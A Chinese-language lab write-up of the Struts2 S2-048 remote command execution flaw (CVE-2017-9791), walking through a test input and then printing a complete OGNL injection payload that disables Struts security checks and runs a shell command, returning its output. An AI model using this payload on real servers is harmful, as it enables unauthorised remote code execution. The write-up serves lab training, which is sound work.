# st2-048远程命令执行（CVE-2017-9791）by [anonymity3712](https://github.com/anonymity3712)

## 漏洞描述

CVE-2017-9791即st2-048漏洞，是在Struts 2.3.x 系列的 Showcase 应用中演示Struts2整合Struts 1 的插件中存在一处任意代码执行漏洞。当你的应用使用了Struts2 Struts1的插件时，可能导致不受信任的输入传入到ActionMessage类中导致命令执行。

## writeup

启动靶场环境

选择Integration中的Struts 1 Integration

![](./20200513142620.png)

在Gangster Name处输入`${1+1}`，Gangster Age和Gangster Description处随意填写

![](./20200513142803.png)

点击Submit按钮

返回1+1的运算结果，证明漏洞存在

![](./20200513143114.png)

重新访问/integration/editGangster.action页面，进行burp抓包。

构造payload

```
%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```

payload需要进行url转码

![](./20200513143922.png)

![](./20200513144117.png)

获取flag

也可以直接利用工具一把梭

![](./20200513144307.png)/20200513142620.png)
